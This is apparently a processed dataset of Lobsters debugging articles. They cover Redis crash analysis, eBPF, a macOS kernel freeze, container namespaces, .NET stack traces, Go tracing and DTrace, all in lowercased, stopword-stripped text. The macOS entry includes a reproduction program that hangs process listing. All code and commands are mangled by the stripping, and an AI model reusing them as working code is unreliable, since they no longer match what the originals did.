heavily loaded trying process forward network output customer server also clear real router ae responding quickly frequent rogue server avoid caching fake arp entry simply installed hardcoded entry made permanent jcs thalamus sudo arp f ae permanent deleted jcs thalamus arp n ae permanent static response time server instantly much faster website returned normal opened trouble ticket network provider removed hopefully compromised server network within minute followed find customer vlan largely eliminates problem like update canceled service provider
346,Lobsters,debugging,Debugging,A short tale of a read overflow,http://antirez.com/news/117,short tale read overflow,antirez http,antirez day ago view blog post also experimentally available medium http long running process crash pretty uncool process happens take lot state memory love web programming framework able without major performance overhead create new interpreter new state page view deallocate every resource used end page generation inherently reliable programming paradigm memory leak descriptor leak even random crash time time constitute serious issue however system software like redis side spectrum side populated thing never crash month ago received crash report colleague dvir volk developing redisearch redis module clear crash due programming error inside module perhaps corrupting heap bug inside redis however looked lot like real problem radix tree implementation redis bug report start cut paste starting redis crashed signal crashed running instuction accessing address backtrace redisserver cluster redisserver cluster redisserver cluster radix tree full memmove call redis crashed exactly trying access memory address oddly zero padded end first thought sure wrong memory movement address get overwritten zero leading crash program attempt deference address pretty proud radix tree implementation implementation complex data structure implement rocket science fuzz tester come able cover whole source code trivial lot non trivial state definitely interesting fuzz tester fuzzing reach crash compare implementation radix tree dictionary iterator reference implementation us hash table qsort exactly semantics short easy audit implementation receiving crash report improved fuzz tester ran day without valgrind wrote additional data model created test using million key despite effort could reproduce crash day ago would discover bug implementation testing time aware could simply never find bug failing reproduce gave one week ago received two additional bug report almost address zero padded dvir crash accessing address issue accessing address issue accessing address time read every memmove memcpy realloccall inside source code trying figure something wrong reason fuzz tester able catch found nothing inspecting redis crash report noticed something funny crash redis report memory mapped area process thing like following preparing test memory region byte add result exactly accessed address crash reported issue program crashing memory address corrupted accessing address immediately end heap checked issue true instance basically end heap edge start unmapped address acting memory guard order detect crash access performed outside bound common technique certain c memory sanitation tool used employ past tool would provide drop replacement formalloc would return address allocated edge non accessible memory page every overflow would immediately detected way program would crash case deallocating radix tree node end heap simple realize problem read overflow never detect read overflow otherwise access data outside structure inside mapped memory bug would totally harmless silent exception operation end mapped region finally clear place look portion c code remove edge pointer memmoving remaining child pointer edge byte one position int taillen parent size e parent data debugf raxremovechild tail len dn taillen memmove e taillen since one data byte le also child pointer start one byte memmove char cp cp parent sizeof raxnode move remaining tail pointer right position well sizet valuelen parent iskey parent isnull sizeof void memmove char c taillen sizeof raxnode valuelen update size parent size asked user send redisserver binary produced crash report reading disassembled code clear many cpu register also included redis crash report would still populated variable note cpu register rdi rsi rdx used order pas first three argument memmove one crash parent rbp checking rdi rsi rdx extract memmove argument memmove memmove go bound accessing proof checking register could also reconstruct node header order understand memmove count argument obtained something definitely wrong basically seeing disassembled executable match c function reading possible read buffer happen state sane count incorrectly computed crashing instance night worked damn thing two day stop decided create gist post twitter see somebody could explain c would turned assembler compiler lucky enough friend fedor indutny nodejs fame willing help quickly realized clear c assembler could match analyzing right c newer version function fedor gcc hand compiler used user reporting bug tried compile older version code realizing two version emitted code matched perfectly pinged asking sure recent redis version absolutely sure redis started doubt took diff raxc redis unstable branch redis happened fixed bug ten month ago course stream implementation cherry picking activity bugfixes unstable backported redis fix inside commit stream constantly skipping everything finally clear debugged day bug version testing lame mistake bother write blog post believe lesson learned first lesson crash report like one redis able emit key asset system software allow reconstruct state bug able replicate happen rarely wild bug already fixed able exactly understand happening looking bug report register dump offending address call stack second lesson learn assembler today least read comfortably code emitted compiler follow happening want get involved system programming often way understand happening heisenbug debugger help much gdb claiming crash happening instruction parent size course impossible gdb blame modern compiler optimization turned generate code hardly matched back source code another lesson powerful well done fuzz testing fuzz tester immediately able find bug broken version similarly fact radix tree crash never observed bug fixed long time ago speaks radix tree implementation complex yet thanks fuzz testing apparently bug implementation new complex want stress importance fuzzing find crash good security people want discover zero day fuzzing system software perform random operation according sane operation model compare outcome reference implementation finally clear lesson next time need carefully working feature branch making fix specific feature branch working feeling would merge everything back asap case putting radix tree update commit implementing stream thing fatal error well bonus point smart friend help bit lost point kind help fyodor helped realize last part puzzle quickly move forward afraid ask help get involved system software remember different field programming work bring thing forward must prepared spend day trying understand bug happened bug often able reproduce user deserve software crashing like
347,Lobsters,debugging,Debugging,From intuition to methodology in debugging,http://wozniak.ca/blog/2018/02/04/From-intuition-to-methodology-in-debugging/index.html,intuition methodology debugging,book review intuition methodology debugging,book review intuition methodology debugging second series review debugging book guide debugging edition u holtmann h keding wloka createspace pp debugging indispensable rule finding even elusive software hardware problem david j agans amacom pp debugging thinking multidisciplinary approach robert charles metzger elsevier digital press pp debugging may start notice pattern successfully solving problem explaining pattern difficult debugging great skill learn mentoring know know tool use use good strategy dealing latest bug report even tackle problem first place debugging describes nine rule address question frankly elect ignore gon na bad let get quibble way first agans come across lovable geeky uncle whose joke land try formal folksy two word comic sans better way make diagram undermine good point advice provides however fantastic unlikely better book debugging reading queue wonderful book applicability terseness relatability worked tough problem advice familiar surely learn something use ground advice get point across great strength book alternating abstract concrete even better specific text drag trying illustrate tool usage war story may discus dated dated book matter central character journey problem solution debugging without rule would like trying make movie without script notably rule prescribe particular process instead aim principle thought rule odd way undermine book read may feel need read book feel intuitively correct author behind guide debugging expand rule try put formalism behind et al give general sounding title aim squarely cc developer target audience succeed admirably advice solid pollute prose full code listing saving appendix discussion even require read code listing understand going fairly certain code included sense completeness paramount importance author structured approach debugging attack looking data flow cc development give location time space consider take expanded version golden rule say find issue location ordering rule give formality although find ordering strictly necessary really partial order extra rule emphasize element software development practical necessity act debugging gratifying aspect guide debugging treatment tool instead using illustrate point emphasize actually act golden rule must good set tool know use furthermore tool must certain capability majority book spent looking different class problem tool class able accomplish inevitably example specific tool kept mercifully short worked fair bit cc year found technique pitfall describe worth reading et al good job taking rule agans tailoring particular domain almost feel like procedure loosely structured one interested splitting semantic hair call method procedure convinced et al hit mark providing structured process talk come pretty close book spearheaded rule capture essence problem solving debugging problem solving given situation something supposed job make right thing intuition debugging working rule give perspective make ask question make think carefully trying tool necessary get detail important tool intellect experience decent set heuristic debugging thinking go angle considerably ambition approach provide method debugging six different persona detective mathematician safety expert psychologist computer scientist engineer daunting tome page significant departure concision two book persona get detailed description method used find bug method based worldview corresponding field detective mathematician persona get considerably attention four nearly text devoted two large chapter case study demonstrate apply method largely unnecessary unless find reading page c program terminal output enjoyable describing debugging thinking difficult touch many topic metzger satisfied lack rigour set forth approach aim provide explicit methodology debugging characterizes methodology cognitive thoughtbased instead constructive examplebased find compelling way describes make sound debugging approach advocate thought found constructive approach present way even unintentionally tend lack good set question asking generalization action presented imply mechanistic without reflection typically assume reader already done thinking need help detail developer already asked useful question know deal particular situation setup thankfully book dwell premise mostly stick task hand coming method debugging amount material covered extensive particular attention literature review lot space devoted describing background discipline usually overview pertinent study provide perspective evidence reference recommendation incredibly thorough worth exploring discussion psychology error particular interest problem never coalesces something coherent reason unfortunate many good point raised one reason gel book emphasizes structure factual presentation summary order methodology effective must presented clearly irony text methodology left reader discern fact never really defined best way found get overview method read extensive table content looking content get gist method see rule agans et al peeking summary nature presented book instead long collection subsection use table content look three chapter devoted detective example method make sense reading text wonder took long make point really important provide much background citation fictional character technical text people familiar concept detective going forty page make miss forest tree lead significant shortcoming book writing never read stilted prose like calling thing overlooked kind writing natural language processor could love mechanical disorienting long stretch practically see template work repetition stultifying repetition get pedantry list enumerating possibility written mindnumbing detail simple sentence would worse even list option written full sentence sentence exact structure blandness verbosity writing overshadows point book debugging thinking partially succeeds providing deeper understanding bug fix lot work reader
348,Lobsters,debugging,Debugging,Adding a new statement to Python's syntax in python_terp,http://blog.asrpo.com/adding_new_statement,adding new statement python syntax pythonterp,adding new statement python syntax pythonterp stackoverflow answer pythonterp pythonterp adding untilstmt debugging debugging parser debugging semantics stepping adding statement cpython allows way footnote blog post blog index,adding new statement python syntax pythonterp stackoverflow answer show add statement python post show pythonterp debug modification also serve missing documentation pythonterp statement analogous statement block executed condition met stackoverflow answer expect num num print num num print adding untilstmt start interpreter try ipython testpythonreplpy p simport simpleast p num p num print num num surprisingly modification parser nt able handle statement let press controld drop host interpreter make change introduce new grammar rule untilstmt similar whilestmt grammar pythongrammarfulldefinition pythongrammarextra grammar r untilstmt test suite add list compound statement grammar r compoundstmt ifstmt whiletruestmtwhiletrue whilestmt untilstmt simpleforstmt forstmt trystmt withstmt funcdef classdef decorated replace parser new parser modified grammar pyterpparser pythoninterpreter grammar grammar add semantics adding function simpleastpy mimicking whilestmt def untilstmt condition block whiletrue evaluate condition return none evaluate block done save simpleastpy test pyterprepl p simpleastreloadmodule simpleast p num p num print num num debugging wo nt always lucky get everything right first try let see example debugging debugging parser help debug parsing step add breakpoints grammar bp example untilstmt bp test suite bp bp shorthand pdbsettrace imported default could write python expression let also set source time get stack trace parser grammar r untilstmt bp test suite bp pyterpparser pythoninterpreter grammar grammar pyterpparsersource grammar read input string file reading p prompt break often line instead make string test parse num print num num pyterpparserparse grammar hit first breakpoint examine input return string module none pdb selfinput nuntil num n print num n num index input grammar matcher stack make sure right place pdb selfst file grammar line function none apply grammar fileinput file grammar line function fileinput fileinput emptyline sameindent stmt endmarker file grammar line function fileinput quantified fileinput emptyline sameindent stmt endmarker file grammar line function fileinput fileinput emptyline sameindent stmt endmarker file grammar line function fileinput fileinput emptyline sameindent stmt endmarker file grammar line function fileinput apply fileinput emptyline sameindent stmt endmarker file grammar line function stmt stmt compoundstmt simplestmt file grammar line function stmt apply stmt compoundstmt simplestmt file grammar line function compoundstmt compoundstmt ifstmt whiletruestmtwhiletrue whilestmt untilstmt simpleforstmt forstmt trystmt withstmt funcdef classdef decorated file grammar line function compoundstmt apply untilstmt file grammar line function untilstmt untilstmt bp test suite bp file grammar line function untilstmt action untilstmt bp test suite bp everything look alright let keep going pdb c return string module none pdb selfinput nuntil num n print num n num pdb selfst file grammar line function untilstmt action untilstmt bp test suite bp first breakpoint nested suite block continue finally back second breakpoint pdb c return string module none pdb c return string module none pdb selfst file grammar line function untilstmt action untilstmt bp test suite bp look parent frame cumulated output see match expectation pdb selfstack output none binary name num number suite printstmt name num augassign name num operation number let pretty print see better pdb selfstack output pprint binary str name str num number int pdb selfstack output pprint suite printstmt name str num augassign name str num operation str number int look like condition block body expected continue parsing complete debugging semantics debugging newly defined untilstmt function add breakpoints bpoint def untilstmt condition block whiletrue bpoint evaluate condition return none evaluate block drop u pdb debugger bpoint get stack trace information pdb u return func argsvalue pdb selfstack scopekeys funcname caller break block parent return func continue condition pdb selfst file line function main untilstmt num print num num file line function main call num print num num file libsimpleastpy line function untilstmt whiletrue whiletrue bpoint evaluate condition return none evaluate block file libsimpleastpy line function untilstmt suite whiletrue bpoint evaluate condition return none evaluate block file libsimpleastpy line function untilstmt call bpoint file libsimpleastpy line function untilstmt name bpoint pdb p selfstack scope num continue done examining value pdb c could modify ast later iteration example longer want breakpoint instead want print value condition examining stack selfst see bpoint call index child root selfstack pdb selfstack rootpprint suite call name str bpoint arglist singleif call name str evaluate arglist name str condition returnstmt name str none call name str evaluate arglist name str block emptyline str n let set print evaluate condition show truth value condition pdb selfstack root node printstmt node call node name evaluate node arglist node name condition pretty tedious type instead use parser pdb selfstack root selfparserparse grammar print evaluate condition n actually shortcut made pdb selfstack root selfast print evaluate condition let check made change right place continue execution pdb selfstack rootpprint suite printstmt call name str evaluate arglist name str condition singleif call name str evaluate arglist name str condition returnstmt name str none call name str evaluate arglist name str block emptyline str n pdb c false true p loop stopped condition true expected stepping execute next ast node pythonterp rather host interpreter enable debugger hitting first breakpoint pdb selfdebug true pdb c dbg debugger bit buggy moment lack use maintenance support usual command store multiple command b prefix b n n n pressing n three time followed enter time twice intended used come back earlier point breakpoint quickly case worth setting appropriate breakpoint destination instead finally lone drop u pythonterp repl keeping current call stack adding statement cpython since stackoverflow answer new feature python allows way modify cpython using python add untilstmt probably use token transformation whilestmt although nt thought one footnote answer mirror blog post author simplicity add untilstmt without optional else block adding else block would difficult either posted feb blog index
349,Lobsters,debugging,Debugging,Spying on a Ruby process's memory allocations with eBPF,https://jvns.ca/blog/2018/01/31/spying-on-a-ruby-process-s-memory-allocations/,spying ruby process memory allocation ebpf,asciinema demo http githubcomjvnsrubymemwatcherdemo work part ebpf uprobes writing first bcc program http githubcomiovisorbcc documentation initial bpf program wrote gist get name class though mapping ruby process memory memory copymap function defined calling segfaults always rust program python program work together design principle magic twitter thread post,today instead working cpu profilers took day experiment totally new idea idea beginning day could take arbitrary ruby process pid already running start tracking memory allocation spoiler got something working asciinema demo happened basically show liveupdating cumulative view rubocop memory allocation second counted class see rubocop allocated thousand array string range enumerator etc demo work without making code change rubocop ran bundle exec rubocop start code http githubcomjvnsrubymemwatcherdemo though extremely experimental likely work machine right work part ebpf uprobes way work fundamentally relatively simple linux feature called uprobes let attach code write arbitrary userspace function outside process ask kernel modify function program running run code every time function get called ask kernel run code though least ebpf ask run ebpf bytecode basically c code restricted memory access loop idea run tiny bit code every time new ruby object created rubocop code would count memory allocation per class function wanted instrument add uprobe newobjslowpath static inline value newobjslowpath value klass value flag value value value rbobjspacet objspace int wbprotected goal grab first argument function klass count many allocation klass writing first bcc program bcc bpf compiler collection http githubcomiovisorbcc toolkit help write bpf program c compile bpf program bpf bytecode insert compiled bpf bytecode kernel write python program communicate bpf bytecode running kernel display information bytecode useful way lot digest luckily documentation pretty good lot example program copy repo initial bpf program wrote gist pretty short line c part python part explain bit think obvious really interesting first c part idea code run every time newobjslowpath run code declares bpf hash basically data structure use store data send data back userspace python frontend read defines count function read first argument function basically count klass bpfhash count sizet int count struct ptregs ctx zero val sizet klass ctx val countslookuporinit klass zero val return next python part loop every second read count bpf hash magically accessible python somehow print clear count bgettable count true sleep ossystem clear print class pointer count print top list reversed sorted countsget key value keyvalue key countskeys top top count ptr top print ptr count countsclear outcome program cool live updating view showing u many class allocated awesome get name class though far relatively easy address class useful though mean anything instance allocated wanted get name class helpfully function ruby take class pointer return char string name inside ruby process exactly call function could calling function seem way easier trying reverse engineer ruby internals goal call function disturb process profiling certainly call function ended writing separate rust program map pointer class name mapping ruby process memory memory terribledelightful plan calling basically copy memory map target process profiler process call hope work memory target process call function process function process relevant code snippet copying memory map copymap function defined basically could copy memory map except one called syscall vvar copy sure think needed map map mapflags rwp copymap map source protread protwrite unwrap mapflags r p copymap map source protread protwrite unwrap mapflags rxp copymap map source protread protwrite protexec unwrap calling calling pretty easy needed find address already know rbspy cast address right kind function pointer extern c fn call resulting function course copying memory map casting essentially random address function pointer calling resulting function unsafe rust still finally got work like today delighted segfaults kept running segfaults trying translate class pointer name instead debugging wanted get demo work decided figure ignore segfaults always segfaulting sometimes silly fun thing cause segfault fork child process try potentially segfaulting thing print answer child process segfaults ignore keep going worked great rust program python program work together way final demo work python program charge getting class pointer counting many time allocated uprobes bpf rust program charge mapping class pointer class name call pid list class pointer command argument print mapping stdout course hacky mess worked got work day made super happy think possible rust long compile save appropriate bpf program able call right system call rust insert compiled bpf program kernel without using bcc think design principle magic main design principle using right build tool feel really magical also hopefully useful course think ebpf enables lot really awesome thing want figure show people feel like idea streaming live update memory ruby process allocating without make change ruby program beforehand feel really magical cool still lot work make useful clear stable make delighted demo questionscomments twitter thread post
350,Lobsters,debugging,Debugging,I think I found a Mac kernel bug?,https://jvns.ca/blog/2018/01/28/mac-freeze/,think found mac kernel bug,rbspy tried reproduce sierra mysterious freeze mac http think c program freeze part mac bug affecting htop github issue htop mac comment workaround twitter thread post,working mac support rbspy accidentally found something look like mac kernel bug basically managed write short line c program reliably cause p stop working without allocating memory anything like seems kernel bug high sierra sierra someone tried reproduce sierra look like new bug mysterious freeze mac past week building mac support rbspy ruby profiler put mac support branch github yesterday amazing early adopter tried branch reported froze computer activity monitor stopped working open new terminal etc extremely surprising could happen detailed report http really mystified could program running root freeze someone computer somebody suggested maybe program allocating lot memory think turn memory allocation problem c program freeze part mac parkr incredibly helpful managed narrow problem right calling taskforpid mach function since taskforpid seemed issue worked reproducing issue small c program program show bug run loop bit racey sometimes need try time freeze include machmachinith include machporth include syswaith include unistdh include stdioh int main pidt pid fork pid execv usrbintrue null machportnamet task machportnull taskforpid machtaskself pid task printf ran taskforpidn int waitstatus wait waitstatus behaviour see run freezemac example program hang run p another tab p hang display output also trying ctrlc stop p work happens mac developing running high sierra core issue seems exec new program like usrbintrue immediately run taskforpid program process ran taskforpid hang p stop working though terminate ctrlc thing seem go back normal want try mac run program risk freeze thing everything go back normal press ctrlc know happen run wget http cc freezemac freezemacc freezemac try running p starting activity monitor nt work bug affecting htop somebody twitter pointed github issue htop mac people reporting htop sometimes sporadically freeze computer way terminal start activity monitor work comment grrrrrrrrr say race condition taskforpid look poc similar workaround weird really understand underlying kernel issue anyway workaround run taskforpid process immediately exec ing instead sleep millisecond first hopefully new knowledge get rbspy work mac without freezing user computer system programming weird exciting though thought question twitter thread post
351,Lobsters,debugging,Debugging,How do you spy on a program running in a container?,https://jvns.ca/blog/2018/01/26/spy-container/,spy program running container,http rbspy work container different mount namespace fix switch mount namespaces actual code look like switch mount namespaces multithreaded setns man page actually even need switch mount namespaces helpfully pointed twitter proc man page twitter thread,yesterday added linux container support rbspy instance rbspy running host machine profile ruby program running container pretty simple thing line code http thought would fun explain adding container support involves practice rbspy work container first program running container program like program see running p normal thing rbspy like reading memory process work fine program running container one small gotcha small part beginning program read binary program memory map ruby binary sometimes another dynamically linked library make concrete right container computer running ruby program pid host pid namespace looking memory map sudo cat show ruby binary running ruby library loaded called rxp r p rwp rxp p r p rwp need address binary mapped process memory easy look done well content getting content run problem file host filesystem running ubuntu container running ubuntu different system ruby version precise issue target process container different mount namespace rbspy fix switch mount namespaces make rbspy work containerized process need switch target process mount namespace reading reading two file switch back previous mount namespace right away write output filesystem right place pretty simple pseudocode setns target process namespace mount read read setns mount actual code look like switching mount namespaces hard switch mount namespaces needed open file proc pidnsmnt get file descriptor file call libc setns fd libc clonenewns reason clonenewns mean mount namespace really easy thing note careful remember open procselfnsmnt switching mount namespaces file descriptor use switch back old mount namespace make sure always switch back old mount namespace even error reading file defer like go defer keyword one used come rust crate called scopeguard id process mount namespace inode number procpidnsmnt use inode number figure whether two process mount namespace code snippet let otherprocmnt format proc nsmnt pid let selfprocmnt procselfnsmnt need get proc pidmaps switching namespaces let allmaps procmaps pid read inode number check two mount namespaces f metadata otherprocmnt stino f metadata selfprocmnt stino getprograminfoinner pid allmaps else switch mount namespace switch back getting program info need save fd current mount namespace switch back let newns f file open otherprocmnt let oldns f file open selfprocmnt switchns newns error point always switch back old namespace defer switchns oldns let proginfo getprograminfoinner pid allmaps proginfo switch mount namespaces multithreaded originally wanted create separate thread namespaceswitching juggle possible though setns man page set straight process may reassociated new mount namespace multithreaded description setns start man page say setns reassociate thread namespace think change kind namespaces multithreaded like guess change network namespace single thread change mount namespace good know actually even need switch mount namespaces posted post someone helpfully pointed twitter read file process mount namespace read way easier switching mount namespaces proc man page say procpidroot note however file merely symbolic link provides view filesystem including namespaces set perprocess mount process thought nice example understanding fundamental container work use different linux namespaces host process case mount namespace relevant namespace care rest namespaces helped u add container support really easily need care docker anything like irrelevant container runtime container using certainly interact docker need make simple system call work questionsthoughts twitter thread
352,Lobsters,debugging,Debugging,Stacktrace improvements in .NET Core 2.1,https://www.ageofascent.com/2018/01/26/stack-trace-for-exceptions-in-dotnet-core-2.1/,stacktrace improvement net core,intelligible stack trace async iterators dictionary key found issue stack trace davkean dotnetcorefx pr post exception stack dotnetcoreclr pr edi boundary dotnetcoreclr pr iterators async method dotnetcoreclr pr item added anipik dotnetcoreclr downlevel runtimes going bendemystifier code exception stacktraces,intelligible stack trace async iterators dictionary key found net core intelligible async stack trace mean bold claim well determine correct overload called async iterator method stacktrace possible previously systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key programsequence start movenext programsequence start end movenext programmethodasync programmethodasync programmethodasync programmethodasync programmethodasync programmain string args issue stack trace david kean davkean raised following issue make stack trace readable dotnetcorefx corefx oct task async await prevalent stack trace become lot le readable stack trace output net async winding occurred october saw issue since net core fully open source could actually change refresher code bottom post output following stack trace thrown exception systemcollectionsgenerickeynotfoundexception given key present dictionary systemthrowhelperthrowkeynotfoundexception systemcollectionsgenericdictionary tkey key program sequence program sequence program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program methodasync end stack trace previous location exception thrown systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task program main line number removed brevity eg c workexceptionsprogramcs line sometimes even verbose glue section systemruntimeexceptionservicesexceptiondispatchinfothrow systemruntimecompilerservicestaskawaiterthrowfornonsuccess task task systemruntimecompilerservicestaskawaiterhandlenonsuccessanddebuggernotification task task systemruntimecompilerservicestaskawaitervalidateend task task systemruntimecompilerservicestaskawaitergetresult general purpose stack trace determine source code error occurred path got point however async stack trace till impenetrable contain lot unhelpful noise pr post exception stack stack trace generally expected direct flow exception thrown caught async function resume exception performs extra step determine respond ensure cleanup done continuing extra step get added call stack help anyway determine call stack occur exception well noisy repeative add value determining code reached point call stack happened call stack reported agree removing post exception stack frame hide post exception stack frame dotnetcoreclr stack trace start become approachable systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key program sequence program sequence program methodasync end stack trace previous location exception thrown program methodasync end stack trace previous location exception thrown program methodasync end stack trace previous location exception thrown program methodasync end stack trace previous location exception thrown program methodasync end stack trace previous location exception thrown program main reported call stack agrees actual call stack pr edi boundary exception async propagated using exceptiondispatchinfo class mark boundary join point end stack trace previous location exception thrown inform two call stack merged transition occurred async frequent noise add value remove edi boundary async dotnetcoreclr stack trace becomes valuable systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key program sequence program sequence program methodasync program methodasync program methodasync program methodasync program methodasync program main pr iterators async method point stacktrace clean noise however still hard determine exactly called stacktrace contains method signature async statemachine infrastructure created c compiler original source code detemine method name present determine exact overload called without digging deeper resolve iterators async method stacktrace dotnetcoreclr stacktrace much closer orignial source systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key programsequence start movenext programsequence start end movenext programmethodasync programmethodasync programmethodasync programmethodasync programmethodasync programmain string args pr item added picked throw exception example additional bonus anirudh agnihotry anipik added key item added keynotfoundexception dotnetcoreclr mean exception actually give information key found systemcollectionsgenerickeynotfoundexception given key present dictionary systemcollectionsgenericdictionary tkey key programsequence start movenext programsequence start end movenext programmethodasync programmethodasync programmethodasync programmethodasync programmethodasync programmain string args downlevel runtimes going hopefully coming mono shortly net framework later stage earlier runtime version net core net framework mono get similar effect plus using bendemystifier nuget package using demystify exception catch exception e consolewriteline edemystify produce richer output match c source code nice built systemcollectionsgenerickeynotfoundexception given key present dictionary tvalue systemcollectionsgenericdictionary tkey tvalue getitem tkey key ienumerable int programsequence int start movenext ienumerable int programsequence int start int end movenext async task int programmethodasync async task int programmethodasync int async task int programmethodasync int int async task int programmethodasync int int int async task int programmethodasync int int int int async task programmain string args net core best version net core many reason one little thing make code exception stacktraces code generates exception stacktrace class program static dictionary int int dict new dictionary int int static async task main string args try var value await methodasync consolewriteline value catch exception e consolewriteline e static async task int methodasync int int int int await methodasync static async task int methodasync int int int await methodasync static async task int methodasync int int await methodasync static async task int methodasync int await methodasync static async task int methodasync await taskdelay int value foreach var sequence value return value static ienumerable int sequence int start int end var start end foreach var item sequence yield return item static ienumerable int sequence int start var end start var start end dict dict throw exception yield return
353,Lobsters,debugging,Debugging,Using Go 1.10 new trace features to debug an integration test,https://medium.com/@cep21/using-go-1-10-new-trace-features-to-debug-an-integration-test-1dc39e4e812d,using go new trace feature debug integration test,using go new trace feature debug integration test http takeio generate cpu profile view cpu profile web ui new generate blocking profile improved generate trace information overload way much noise limit goroutine improved http http,using go new trace feature debug integration testi integration test complex sadly took long start able diagnose using new feature go trace tool post describes workflow led therethe example code using post http integration test bit complex generally startup slow due single goroutine many lot different thing example takeio similar startup part integration testmy toy example postgenerate cpu profilemy first thought generate cpu profilego test cpuprofile cpuprofunfortunately show cpu usage integration test hanging somewhere due network usage pprof node accounting totalshowing top node flat flat sum cum cum pprof cumshowing node accounting totalshowing top node flat flat sum cum cum cpu profile web ui new tried looking profile web ui see would help tool pprof cpuprofnope still showing cpu usagegenerate blocking profile improved thought maybe blocking stuff generated blocking profilego test tried use nothing showed unhelpful go tool pprof blockout main binary filename availabletype delayentering interactive mode type help command option pprof topshowing node accounting total flat flat sum cum cum unknown old solution compile test binary first go need test blockprofileblockout tool pprof blockout pprof topshowing node accounting totaldropped node cum showing top node flat flat sum cum cum runtimeselectgo sync waitgroup wait still bit noisy real codegenerate tracego trace tool need level detail need limiting profile specific goroutinesgo test trace traceoutnow let view trace tool trace traceoutthe initial uitoo much information overload fun ui honestly helpful far hunch networking related let click network blocking profile button abovefull network blocking profilein actual app way much noise integration test large number networking call startup time wanted optimizelimit goroutine improved know specific goroutine start server let load trace clicking goroutines buttonnotice clickable knew name integration test goroutine go takeio function example codesmall execution time large total timefor goroutine execution time small much total time large since waiting io timefrom needed find stack trace causing slow startup time enough use case want morethere arrow notice blue arrow goroutine page click download pprof usable profile rather download reference directly cli tool pprof http profile http http profile delayentering interactive mode type help command option pprof topshowing node accounting totaldropped node cum showing top node flat flat sum cum cum runtimeselectgo nethttp client nethttp client get nethttp client send nethttp transport roundtrip nethttp transport getconni explore like normal pprof profile top cumulative show stack block goroutinei wanted share coworkers created flamegraph flamegraphs great way visualize complex stack unfortunately need use original pprof thisgo get githubcomgooglepprofi load profile using pprof one go notice go tool front command pprof http http flame graphflamegraph examplethis flamegraph seems obvious toy example real code stack trace complex able help tremendously
354,Lobsters,debugging,Debugging,Debugging Emacs or: How I Learned to Stop Worrying and Love DTrace,http://nullprogram.com/blog/2018/01/17/,debugging emacs learned stop worrying love dtrace,bsd elfeed seeing error responsibility downloading feed data hunt zebra bryan cantrill dtrace freebsd bryan cantrill dtrace bsd interview writing talk scattered around dtrace blog illumos cddl infamously include zfs dtrace released slew partial option strace broken version omnios enchive keep software tiny community pkgsrc openindiana freebsd dtrace dtrace really freebsd raspberry pi freebsd support raspberry pi mostly program vim day process sentinel curl linebuffered problem ran four year ago writing emacsql oneliner old boilermaker story dtrace quickly helped identify place hit emacs hammer,january update article featured bsd starting time elfeed experiencing strange spurious failure every often user seeing error spoiler warning updating feed error process sentinel search failed use elfeed might even seen surface appeared curl tasked responsibility downloading feed data producing incomplete output despite reporting successful run since run successful elfeed assumed certain data curl output buffer since failed hard unfortunately issue reproducible manually running curl outside emacs never revealed issue asking elfeed retry fetching feed would work fine issue would randomly rear head elfeed fetching many feed parallel stress time error discovered curl process exited vital debugging information lost considering likely bug emacs really reliable way capture necessary debugging information within emacs lisp indeed later proved case quickanddirty work around use conditioncase catch swallow error bizarre issue show rather fail badly front user elfeed could attempt swallow error assuming reliably detected treat fetch simply failure sit comfortably elfeed done due diligence checking error already someone lying elfeed intended catch pant fire someday need witness bug one machine elfeed part daily routine surely experience issue someday plan day come run modified elfeed instrumented capture extra data would also routinely run emacs gdb could inspect failure deeply wait hunt zebra bryan cantrill dtrace freebsd holiday rediscovered bryan cantrill system software engineer worked sun well known dtrace first exposure bsd interview rewatched interview decided lot learn become personal hero scoured internet writing talk besides already linked article couple great presentation also find writing scattered around dtrace blog interesting operating system technology came sun final year notably dtrace zfs bryan speaks passionately almost matter luck survived oracle acquisition thanks sun releasing open source nick time otherwise would lost forever scattered exsun employee still passionate prior work sun along old customer since picked piece kept going community name illumos like open source flotilla naturally wanted get hand stuff try really good say normally stick linux generally sun technology main reason license incompatibility sun released code cddl incompatible gpl ubuntu infamously include zfs distribution unwilling take risk porting dtrace serious undertaking since got finger throughout kernel also make licensing issue even complicated update feburary dtrace released allowing legally integrated linux linux reputation invented nih syndrome licensing issue certainly contribute rather adopt zfs dtrace reinvented scratch btrfs instead zfs slew partial option instead dtrace normally interested system call tracing go strace though certainly limitation including situation debugging curl emacs another famous example nih linux epoll broken version bsd kqueue want try need install different operating system dabbled omnios o built illumos virtual machine using alien environment test software eg enchive omnios philosophy called keep software kysty really code packaging honestly blame since tiny community best solution probably pkgsrc essentially universal packaging system otherwise also openindiana friendly desktoporiented illumos distribution still short much thing work situation like running linux couple decade ago still difficult interested trying dtrace easiest option day probably freebsd got big active community thorough documentation huge selection package license bsd license duh compatible cddl zfs dtrace ported freebsd dtrace done talking yet described dtrace really pretend write tutorial provide enough information follow along dtrace tracing framework debugging production system real time kernel application production system part mean stable safe using dtrace put system risk crashing damaging data real time part mean little impact performance use dtrace live active system little impact core design principle vital troubleshooting really tricky bug show production dtrace probe scattered throughout system system call scheduler event networking event process event signal virtual memory event etc using specialized language called unrelated general purpose programming language dynamically add behavior instrumentation point generally behavior capture information also manipulate event traced probe fully identified delimited colon provider module function probe name empty element denotes sort wildcard example syscall open entry probe beginning ie entry open syscall entry match system call entry probe unlike strace linux monitor specific process dtrace applies entire system active run curl strace emacs modify emacs behavior dtrace instrument every curl process without making single change emacs negligible impact emacs big deal come elfeed issue freebsd much better poised debugging problem catch act however month since bug report really making connection yet hoping eventually find interesting problem apply dtrace freebsd raspberry pi settled freebsd playground technology decide could always run virtual machine always interesting try thing real hardware freebsd support 